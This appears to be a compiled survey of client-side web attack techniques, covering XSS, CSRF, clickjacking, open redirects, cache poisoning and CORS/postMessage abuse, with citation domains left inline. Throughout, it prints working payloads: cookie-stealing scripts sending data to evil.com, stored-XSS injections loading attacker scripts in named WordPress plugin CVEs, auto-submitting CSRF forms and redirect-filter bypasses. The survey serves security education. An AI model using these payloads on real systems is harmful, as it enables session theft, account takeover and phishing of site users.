Cross-Site Scripting (XSS)

Reflected XSS (non-persistent): Attacker crafts a malicious link or form that reflects input back in the page. For example, a URL like http://example.com/page?name=<script>alert(1)</script> triggers an alert in vulnerable sites
pentest-tools.com
. Common payloads include <script>alert("XSS")</script> or <img src=x onerror=alert(1)>
owasp.org
hackerone.com
. Successful reflected XSS can be used to steal cookies (document.cookie), redirect users, or load malware. For instance, <script>new Image().src="https://evil.com/steal?c="+document.cookie</script> sends the victim’s cookies to the attacker
hackerone.com
. Attackers may also inject fake forms (e.g. a bogus login box) via XSS to phish credentials
pentest-tools.com
hackerone.com
.

Stored XSS (persistent): Malicious script is saved on the site (e.g. in a comment, profile or plugin data) and served to other users. Real-world examples include WordPress plugins with injectable fields. For example, the WP Statistics plugin (CVE-2024-2194) allowed a payload in the utm_id parameter to be stored:

utm_id="><script src="https://attacker/evil.js"></script>

This script executes whenever an admin views the stats page
fastly.com
. Similarly, the WP Meta SEO plugin (CVE-2023-6961) stored unsanitized input from the HTTP Referer header. An attacker sending

Referer: <script src="https://attacker/evil.js"></script>

to a 404-generating URL caused the script to be saved in the database and executed in the administrator’s browser later
fastly.com
. Another example is LiteSpeed Cache (≤5.7.0.1): it stored nameservers and \_msg fields without sanitization, allowing payloads like result[_msg]=<script src="https://attacker/evil.js"></script>
fastly.com
. Stored XSS can lead to complete user account takeover (via cookie/session theft) or content tampering.

DOM-Based XSS: The vulnerability occurs entirely in the browser DOM. Common sources are window.location, location.hash, or document.referrer, passed to dangerous sinks (eval(), innerHTML, document.write(), etc.). For example, a script like:

<script>
  var stuff = unescape(location.hash.substr(1));
  document.write("Input: "+ stuff);
</script>

is vulnerable if no sanitization is done. An attacker can use a URL like

http://target.com/page#<script>alert('XSS')</script>

to execute code in the victim’s browser
akimbocore.com
akimbocore.com
. As Akimbo Core demonstrates, even adding the payload after # (URL fragment) triggers execution via location.hash
akimbocore.com
akimbocore.com
. Many DOM XSS vectors exist: untrusted input assigned to innerHTML, document.write(), form fields, eval(), setTimeout(), etc., using any client-side data (URL, cookies, postMessage, etc.). For instance, jQuery apps sometimes use selectors with location.hash, enabling payloads via the fragment
portswigger.net
akimbocore.com
. An attacker must simply lure a user to click a specially crafted link.

XSS Payload Variations: Beyond <script>, attackers use many contexts: event handlers and URI schemes. E.g. <body onload=alert('XSS')> or <b onmouseover=alert('XSS')>click</b> can execute scripts
owasp.org
. Image tags are common: <img src=x onerror=alert(document.cookie)>
owasp.org
. SVG and META tags can carry JavaScript too. Encoded or malformed script tags (e.g. using &#x3C;script>) or javascript: URLs (like <a href="javascript:...">) evade filters. Advanced payloads include console/code injections, fake login screens, keyloggers (document.onkeypress=new Image()...
hackerone.com
), and CSRF via XSS (using fetch() or XMLHttpRequest to post actions
pentest-tools.com
). All payloads aim to hijack sessions, steal data, or redirect users.

Cookie Theft via XSS: If cookies aren’t HttpOnly, XSS can steal them. A classic payload is:

<script>new Image().src="https://evil.com/steal?cookie="+document.cookie;</script>

This sends document.cookie to the attacker’s server
hackerone.com
. PortSwigger also illustrates using a hidden image to exfiltrate cookies
hackerone.com
. Once the session cookie is captured, the attacker can hijack the user’s session. Even if HttpOnly is set, older browsers or certain exploitation techniques (like abusing TRACE methods) can sometimes reveal cookie data, but XSS remains the most direct method
hackerone.com
pentest-tools.com
.

Cross-Site Request Forgery (CSRF)

Basic CSRF: Attacker tricks a logged-in user’s browser into sending a forged request (GET/POST) to the target site. Commonly done by hosting a malicious page that auto-submits a hidden form or uses JavaScript. For example, using an invisible iframe and form:

<iframe name="csrf-frame" style="display:none"></iframe>
<form method="POST" target="csrf-frame" action="https://victim.site/action" id="csrf-form">
  <input type="hidden" name="param" value="dangerous"/>
</form>
<script>document.getElementById("csrf-form").submit();</script>

This silently submits the form as the victim’s credentials
stackoverflow.com
. OWASP notes that any state-changing action (like form submission) without a per-request token is vulnerable. Even GET requests (like GET /logout) can be CSRF’d by an image or script tag. Modern examples include using fetch() or AJAX from a malicious site to perform actions in the victim’s session
pentest-tools.com
. For instance, the Pentest-Tools demo used an injected <script>fetch('http://vulnerable.site/api', {method:'POST', credentials:'include', body:'data=x'})</script> to forge a login action
pentest-tools.com
.

Login & Logout CSRF: If the login or logout endpoints lack CSRF protection, attackers can force a user to log in as the attacker (login CSRF) or log out (logout CSRF). Login CSRF, detailed by Invicti, involves an attacker’s page submitting a form with the attacker’s credentials to the site’s login URL
invicti.com
. The victim’s browser stores the attacker’s session cookie, so subsequent actions appear under the attacker’s account. This can pre-set the attacker as the “user” or capture the victim’s input (e.g. a phishing login form in the attacker’s account
invicti.com
). Conversely, a logout CSRF simply logs the victim out. Both rely on invisible forms or scripts auto-submitting to the target URL
stackoverflow.com
invicti.com
.

CSRF for Privilege Escalation / Chaining: Complex exploits chain multiple CSRF steps or combine with other flaws. A notable case is CVE-2023-47020 (NCR Terminal Handler 1.5.1), where “multiple CSRF chaining…allows privileges to be escalated… through a crafted request involving user account creation and adding the user to an administrator group.” Here an attacker automated a series of CSRF requests (creating a user, then promoting to admin) to gain admin rights
isomer-user-content.by.gov.sg
. Likewise, CSRF can inject XSS or malicious data if forms lack tokens: for example, CVE-2023-6499 in lasTunes WordPress plugin had “no CSRF check… missing sanitisation…allowing attackers to make logged in admin add Stored XSS payloads via a CSRF attack.”
nvd.nist.gov
. In essence, any chainable action (multi-step forms) can be exploited via CSRF if no tokens are used.

CSRF Bypasses & Variations: Attackers may exploit weaknesses in CSRF defenses. For example, certain defaults or mis-implementations (like binding CSRF token to cookies) can be bypassed by tricks (e.g. empty cookie values)
isomer-user-content.by.gov.sg
. Login CSRF often leverages SameSite cookie issues or hidden forms. CSRF can be delivered via IMG/SCRIPT tags (for GET requests) or via hidden auto-submitted POST forms
stackoverflow.com
. Tools like Burp’s CSRF PoC generator automate attack creation. In practice, every form or state-changing endpoint on a simple site should be assumed vulnerable to these techniques unless a proper nonce/token is verified.

Clickjacking / UI Redressing

Basic Clickjacking: Attacker hosts a benign-looking page (the decoy) and overlays the target site in a transparent or disguised iframe. For instance, the decoy page may include:

<style>
  #target { position: relative; width: 200px; height: 100px; opacity:0.00001; z-index:2; }
  #decoy  { position: absolute;  width: 200px; height: 100px; z-index:1; }
</style>
<div id="decoy">Click the button to win a prize!</div>
<iframe id="target" src="https://vulnerable-website.com"></iframe>

Here the target page’s buttons or links are exactly aligned under the decoy’s elements. When the user clicks “win a prize,” they actually click the hidden button on the target site. PortSwigger illustrates using CSS layers and opacity to overlap the iframe
portswigger.net
. Because the iframe is transparent (opacity≈0) and stacked above (higher z-index), all clicks go to the hidden target page
portswigger.net
. This can trick users into toggling settings, confirming transactions, or even granting permissions. Crucially, clickjacking works even if anti-CSRF tokens exist (since it’s a normal user click), and it only requires that the target site allows framing (no X-Frame-Options or CSP frame-ancestors restriction).

Advanced UI Redressing: Variations include double-framing to bypass framebusting JavaScript, dragging/drop attacks, and nested iframes. Attackers may also use disguised cursors or cursor-hijacking to confuse the user (e.g. moving the actual click target). Another vector is “Likejacking” where Facebook “Like” buttons are hidden under enticing content. Any click action (login, button, checkbox) can be hijacked. Tools and libraries exist to detect clickjacking; defenses include X-Frame-Options: SAMEORIGIN or Content-Security-Policy: frame-ancestors.

UI Phishing with Overlays: Related to clickjacking, attackers sometimes use similar HTML/CSS tricks to display fake login forms or consent prompts. For example, an XSS payload could create an absolute-positioned <div> mimicking the site’s login box, then forward entered credentials to the attacker. While not the classic invisible-iframe attack, it still relies on manipulating the user interface on the client side to deceive the victim. (See DOM XSS section for examples of injected fake login HTML
akimbocore.com
.)

iFrame Embedding & Referrer Abuse

iFrame Embedding Attacks: Even without clickjacking, if the site lacks X-Frame-Options, attackers can embed it in frames for other abuses. For instance, an attacker could place the site’s login or forms in an iframe on a malicious site with messaging or branding to trick users. If combined with a subtle redirect or CSS, they can coerce users into interacting with the hidden frame. While overlapping frames (clickjacking) is one extreme, even a visible but contextually misframed site can confuse users.

Referer Header / Embedding Attack: In some reported cases, attackers use the HTTP Referer (referrer) header as an input vector. For example, one WordPress plugin stored the raw Referer header in its database. An attacker sending a request with a malicious referer (e.g. via an <a> or image tag linking to a 404 page on the site) injected <script> into the plugin’s stored data
fastly.com
. This is a form of stored XSS but notable as a client-visible vector: the attacker often tricks a user into visiting a specially crafted URL (e.g. on a forum or email) so that the site records the malicious referer. Attackers may also embed malicious URLs in third-party content to cause cache poisoning (see below).

Clickjacking to Bypass CSRF: OWASP notes that clickjacking can bypass CSRF protections by inducing a genuine click in the hidden frame
owasp.org
. For example, a site that uses framebusting scripts may only break out of a single frame, so an attacker can nest the site two iframes deep to nullify the framebust
portswigger.net
. Also, mobile versions of sites often lack defenses, so an attacker might lure a user to the mobile page in a frame
owasp.org
.

Open Redirects

Phishing via Open Redirect: A common vulnerability is an unchecked redirect parameter (like redirect=... or url=...) that lets an attacker send victims to arbitrary sites. For example, a link like https://site.com/login?next=https://evil.com might redirect the user to an attacker site after login. Attackers exploit this to make phishing URLs look trustworthy (the domain is real). Evasive payloads include omitting the protocol, using @, or extra slashes. Varppi’s examples show how to bypass naive filters:

If a filter checks that the redirect “starts with” the site, adding @ lets the attacker domain appear:

https://site.com/login?return=https://site.com@attacker.com  
// Interpreted by the browser as https://attacker.com (username “site.com”)

Payload: https://site.com@attacker.com
medium.com
.

If “http://” is blacklisted, adding an extra slash can work:

https:///attacker.com

(Note the three slashes) which browsers interpret as https://attacker.com
medium.com
.

Query tricks: https://attacker.com/?foo=site.com (where the filter only checks for site.com inside)
medium.com
.
These allow an open-redirect parameter to send victims to an arbitrary domain while passing naive checks.

Abuse in OAuth/CSRF Attacks: Open redirects are especially dangerous when chained with other attacks. For example, an attacker can trick a user to log in on a malicious site that immediately redirects them back through a real site’s login, capturing tokens or auto-submitting forms (CSRF on login)
medium.com
invicti.com
. They can also append malicious scripts or tracking tokens in the redirect URL.

Cookies & Session Hijacking

Cookie Theft & Session Hijacking: As noted, XSS is the primary method to steal cookies. If a site’s session cookie lacks HttpOnly, injected JavaScript can read it (e.g. via document.cookie) and send it to the attacker
hackerone.com
pentest-tools.com
. Once the attacker has the session ID, they can impersonate the user. Even without XSS, if the site is served over HTTP (no HTTPS), network attackers can sniff cookies. Attackers may also attempt to overwrite cookies via script injection (e.g. setting document.cookie) or via subdomain control (if the attacker controls a subdomain, they might set cookies for the parent domain). Modern browsers mitigate some of this (e.g. cookie prefixes, Secure/HttpOnly flags), but careless setups on small sites leave sessions exposed.

Session Fixation: Some sites accept session IDs via URL or parameters. An attacker could set up a link that forces the victim’s browser to use a session ID known to the attacker. For example: http://site.com/page?PHPSESSID=attackerSession. If the site doesn’t regenerate session IDs on login, the attacker could then hijack the victim’s session. Though less common on simple sites, it remains a client-visible risk.

Cookie Poisoning / Tampering: If user input is ever reflected in cookies (for example, an insecure “Set-Cookie” header echoing user data), attackers can manipulate cookies by injecting into forms or parameters. While not typical in static sites, dynamic pages sometimes do insecure cookie handling.

Web Cache Poisoning

Injecting Malicious Cache Content: Many simple sites use caching (CDN, reverse proxy, or client caching) to improve performance. An attacker can exploit this by tricking the cache into storing a harmful response. For instance, if a site echoes a query parameter into the page and is cached by URL, an attacker could append a payload to a query string (?utm_source=<script>...) and ensure the response is cached. Subsequent visitors would get the stored malicious response, effectively spreading XSS or other payloads systemically
portswigger.net
. PortSwigger notes that “a poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, and open redirection”
portswigger.net
. Typical techniques involve manipulating request headers (e.g. adding innocuous but cache-affecting headers, or abusing Vary/Accept headers) to insert payloads. On a small site, attackers might use query parameters (even unused ones) to create separate cache entries. If the site doesn’t properly sanitize inputs before including them in responses (even HTTP headers or error pages), an attacker can cause scripts or HTML to be cached. For example, a static blog that includes <h1>Search results for “{q}”</h1> and caches the search page could be poisoned by sending a crafted search term containing a <script> tag.

Cache Key Manipulation: Attacker may craft requests that change the cache key. For instance, adding a ? or # fragment, or certain cookies, can confuse the cache logic. In older servers, missing normalization led to “cache key poisoning” where e.g. //example.com/page and /page were cached differently. Poisoning can also be achieved by signing in and out with unusual query strings so that the cached content leaks sensitive data. In short, any unsanitized reflected value in a page that is cached is a vector for poisoning.

Cross-Origin & Messaging Attacks

postMessage Abuse (DOM XSS): HTML5 window.postMessage() allows cross-origin communication. If a page uses postMessage but fails to verify the sender’s origin or the content of event.data, an attacker can send arbitrary data into the page. For example, in a demo scenario, a popup window blindly accepted messages from any origin. An attacker opened their own window (e.g. evilrewards.html), cloned the message handler, and sent a malicious payload via postMessage
yeswehack.com
. The target window executed it, causing an XSS. YesWeHack’s write-up notes that with missing origin checks, “the message can be sent from any origin…an attacker can leverage this to send malicious messages”
yeswehack.com
. Thus, an attacker’s site can use otherWindow.postMessage(maliciousData, "\*") to hit vulnerable listeners. In practice, any unvalidated use of addEventListener("message") is exploitable.

CORS Misconfiguration: If the site’s API or endpoints use permissive CORS policies (e.g. Access-Control-Allow-Origin: \* or reflecting request Origin without validation), an attacker can read sensitive data via AJAX from their own malicious site. For example, a script on evil.com can do fetch("https://target.com/api/user", {credentials:"include"}) and, if CORS allows it, read the victim’s private data (like profile info). Overly broad CORS is a client-side risk: it lets any origin use a victim’s cookies to access data. This is often used in conjunction with credentialed requests to break SOP.

DNS Rebinding (client-side SSrf): Though more about network, a static or small site might be tricked by DNS rebinding: if an attacker can make the user’s browser resolve the site’s domain to an internal IP, they can cause requests (via JavaScript or hidden elements) to internal network resources on behalf of the site origin. This leverages client-side trust (same origin) to hit internal services.

History/Content Sniffing: Using CSS or JS, attackers can check a user’s browsing history (via :visited styles) or guess open tabs, though modern browsers have largely patched these. Relatedly, a hidden iframe or WebSocket could infer state.

Fingerprinting/Tracking: While not “exploiting the site” per se, client-side scripts can fingerprint visitors (using canvas, audio, font enumeration) to track or deanonymize them. This violates privacy: for instance, drawing hidden canvas images and measuring rendering differences. It’s not a break-in technique, but it is an attack on user privacy via the browser.

Miscellaneous HTML/Browser Attacks

Hidden/Form Field Manipulation: Any form field (including hidden ones) or URL parameter can be tampered with by the user. For instance, a product page with <input type=hidden name=price value=100> can be modified by an attacker to change the price. Similarly, sequential IDs (e.g. /view.php?id=123) can be altered to access others’ data (though that’s an IDOR, partially server-side). On the client side, attackers might try parameter pollution (e.g. sending ?id=1&id=2) to confuse the server or cache.

HTML/CSS Injection: If input is embedded in HTML (even without script), attackers can inject tags. For example, an attacker might break out of a tag context by injecting "> to add new elements or attributes. CSS injection (e.g. style attributes) could be used to overlay content or hide elements. In extreme cases, CSS alone can exfiltrate data (e.g. sensitive attribute values) via url() fetches, although modern CSP and limitations make this hard.

Autocomplete/Autofill Abuse: A malicious form (e.g. injected via XSS) can trick browsers into filling credentials or tokens. If a site auto-populates a field based on URL/query, an attacker link could embed a victim’s token in a query string to be captured.

Data URIs and File Schemes: Some browsers allow file:// or data: URIs in certain contexts. An attacker might try to exploit this (e.g., loading a local file into an iframe or as an image) if filters are misapplied.

Browser Extensions: Some extensions inject scripts into pages or listen to them. Malicious extensions (or breaking a benign extension) can exfiltrate page data or modify behavior. This is more client-side malware than site vulnerability, but relevant for threat modeling.

SSL Stripping / Mixed Content: If a site is reachable over HTTP, a man-in-the-middle attacker can strip HTTPS or inject scripts into the page. Modern browsers deprecate active mixed content, but if a static site loads any http resource, that channel can be hijacked. Also, adding <meta http-equiv="refresh"> or redirects via HTTP can be used as simple exploits if HTTPS is not enforced.

Legacy Features: In older or poorly configured clients, features like XSS filtering (IE’s XSS Auditor), WebSockets, or BOSH (XMPP over HTTP) might be misused. For example, an attacker might try TRACE/XST (cross-site tracing) to steal HTTP-only cookies if TRACE is enabled
owasp.org
.

User Interface Tricking: Beyond clickjacking, attackers can exploit browser UI by stealing focus, opening unexpected dialogs (window.alert, confirm), or spamming popup windows. They may use navigator.share(), clipboard APIs, or WebUSB/WebBluetooth APIs to prompt sensitive actions if available.
